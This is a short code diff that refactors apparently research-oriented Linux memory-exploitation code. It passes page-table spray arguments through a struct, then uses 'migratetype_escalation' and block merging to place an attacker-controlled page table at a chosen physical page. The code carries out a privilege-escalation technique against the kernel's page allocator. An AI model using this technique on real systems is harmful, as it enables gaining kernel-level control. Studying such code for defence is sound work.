@@ -33,14 +33,22 @@ static void* pageblock;
 static void* target;
 static unsigned long target_phys;
 
-int spray_tables() {
-    for(unsigned i = 0; i < NR_PAGE_TABLES_SPRAY; ++i) {
-        void* addr = (void*)(SPRAY_START + kX86_64PageTableSpan * i);
+struct spray_args_t {
+    void*   start;
+    int     fd;
+    std::size_t nr_tables;
+};
+
+int spray_tables(void* ctx) {
+    auto* a = static_cast<spray_args_t*>(ctx);
+
+    for(unsigned i = 0; i < a->nr_tables; ++i) {
+        void* addr = (void*)(a->start + kX86_64PageTableSpan * i);
         if(mmap(addr, PAGE_SIZE, PROT_READ | PROT_WRITE,
-                MAP_FIXED | MAP_SHARED | MAP_POPULATE, fd_spray,
+                MAP_FIXED | MAP_SHARED | MAP_POPULATE, a->fd,
                 0) == MAP_FAILED) {
             printf("Failed to spray tables\n");
-            exit(EXIT_FAILURE);
+            return -1;
         }
     }
 
@@ -84,11 +92,20 @@ int main(void) {
         target_phys = rubench_va_to_pa(target);
 
         void* bait_ptr = (void*)((unsigned long)pageblock + PAGEBLOCK_SIZE / 2);
-        migratetype_escalation(bait_ptr, 9, spray_tables);
+
+        auto spray_args  = spray_args_t{
+            .start = (void*)SPRAY_START,
+            .fd = fd_spray,
+            .nr_tables = NR_PAGE_TABLES_SPRAY,
+        };
+
+        migratetype_escalation(bait_ptr, 9, spray_tables, &spray_args);
         unspray_tables();
 
+        // Move the target as next candidate for page table allocation
         munlock(target, PAGE_SIZE);
         block_merge(target, 0);
+        // Install the page table at the target.
         mmap((void*)(SPRAY_START + PAGEBLOCK_SIZE), PAGE_SIZE,
              PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_POPULATE,
              fd_spray,
